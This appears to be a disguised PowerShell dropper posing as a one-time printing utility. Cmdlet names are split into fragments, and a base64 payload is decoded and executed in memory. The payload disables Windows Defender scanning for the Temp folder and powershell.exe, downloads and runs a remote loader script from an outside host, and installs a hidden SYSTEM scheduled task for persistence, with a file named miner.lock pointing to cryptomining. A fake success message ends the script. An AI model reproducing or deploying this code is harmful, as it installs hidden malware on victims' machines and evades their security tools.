
$p1 = "HKCU:\"
$p2 = "Software\"
$p3 = "MyApp"
$regPath = $p1 + $p2 + $p3

$n1 = "First"
$n2 = "Run"
$n3 = "Completed"
$regName = $n1 + $n2 + $n3


$testCmd = "Test-"
$pathCmd = "Path"
$fullTest = $testCmd + $pathCmd

if (& $fullTest $regPath) {
    $getItem = "Get-Item"
    $propCmd = "Property"
    $fullGet = $getItem + $propCmd
    
    $value = & $fullGet -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    
    if ($value) {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show("This program has already been executed on this device.", "Warning", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        exit
    }
} else {
    $newItem = "New-"
    $itemCmd = "Item"
    $fullNew = $newItem + $itemCmd
    & $fullNew -Path $regPath -Force | Out-Null
}

$setItem = "Set-Item"
$fullSet = $setItem + $propCmd
& $fullSet -Path $regPath -Name $regName -Value "True"


$base64Script = "IyAxLiDDmMKlw5nigKDDmMK0w5jCp8OYwqEgw5nigKbDmeKAnsOZwoEgw5nLhsOYwrPDmcWgw5jCtyDDmMK1w5jCusOZxaDDmMKxIMOZxaDDmMKtw5jCqsOZy4bDmcWgIMOYwrnDmeKAnsOZ4oCwIMOZxpLDmMKnw5nCgcOYwqkgw5jCp8OZ4oCew5jCo8OZy4bDmMKnw5nigKbDmMKxIMOYwqfDmeKAnsOYwq/DmcKBw5jCp8OYwrnDmcWgw5jCqSDDmcuGw5jCp8OZ4oCew5jCqsOZ4oCgw5nCgcOZxaDDmMKww5nFoMOYwqkNCiR0YXJnZXRTY3JpcHQgPSAnQzpcV2luZG93c1xUZW1wXGluaXQucHMxJw0KJGNvZGUgPSAnQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAiQzpcV2luZG93c1xUZW1wIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAicG93ZXJzaGVsbC5leGUiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyAkbG9jayA9ICJDOlxXaW5kb3dzXFRlbXBcbWluZXIubG9jayI7IGlmICghKFRlc3QtUGF0aCAkbG9jaykpIHsgTmV3LUl0ZW0gLVBhdGggJGxvY2sgLUl0ZW1UeXBlIEZpbGUgfCBPdXQtTnVsbDsgdHJ5IHsgSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwczovL2JsYWNrcGhhcm9haDY2Ni5vbmxpbmUvTG9hZGVyLnBzMSIpIH0gZmluYWxseSB7IFJlbW92ZS1JdGVtICRsb2NrIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0gfScNCiRjb2RlIHwgT3V0LUZpbGUgLUZpbGVQYXRoICR0YXJnZXRTY3JpcHQgLUVuY29kaW5nIGFzY2lpDQoNCiMgMi4gw5jCpcOZ4oCgw5jCtMOYwqfDmMKhIMOYwqfDmeKAnsOZ4oCmw5nigKHDmeKApsOYwqkgw5jCp8OZ4oCew5nigKbDmMKsw5jCr8OZy4bDmeKAnsOYwqkgw5jCp8OZ4oCew5jCqsOZxaAgw5jCqsOYwrTDmcWgw5jCsSDDmcKBw5nigJrDmMK3IMOYwqXDmeKAnsOZ4oCwIMOZ4oCmw5jCs8OYwqfDmMKxIMOYwqfDmeKAnsOZ4oCmw5nigJ7DmcKBICjDmeKAocOYwrDDmMKnIMOYwqfDmeKAnsOYwqPDmeKApsOYwrEgw5jCt8OZy4bDmeKAnsOZ4oChIMOYwqPDmeKAmsOZ4oCeIMOZ4oCmw5nigKAgMTAwIMOYwq3DmMKxw5nCgSkNCnNjaHRhc2tzIC9kZWxldGUgL3RuICJTeXN0ZW1QZXJzaXN0ZW5jZSIgL2YNCnNjaHRhc2tzIC9jcmVhdGUgL3RuICJTeXN0ZW1QZXJzaXN0ZW5jZSIgL3NjIG1pbnV0ZSAvbW8gMSAvcnUgU1lTVEVNIC90ciAicG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlIEM6XFdpbmRvd3NcVGVtcFxpbml0LnBzMSIgL2Y=
"

# 4. تجزئة دوال تحويل الفك والتنفيذ في الذاكرة (Memory Execution)
$fromB64 = "FromBase64"
$stringCmd = "String"
$bytesMethod = "System.Convert"

$bytes = [$bytesMethod]::("$fromB64" + "$stringCmd")($base64Script)
$encClass = "System.Text.Encoding"
$decryptedScript = [$encClass]::UTF8.GetString($bytes)


$invExpr = "Invoke-"
$exprCmd = "Expression"
$fullExec = $invExpr + $exprCmd


& $fullExec $decryptedScript



Add-Type -AssemblyName System.Windows.Forms

$getNet = "Get-Net"
$adapterCmd = "Adapter"
$fullAdapter = $getNet + $adapterCmd

$mac = (& $fullAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1).MacAddress

$msg1 = "printing has been done"
$msg2 = " successfully`n`nMAC Address: $mac"
$message = $msg1 + $msg2

[System.Windows.Forms.MessageBox]::Show($message, "Operation Successful")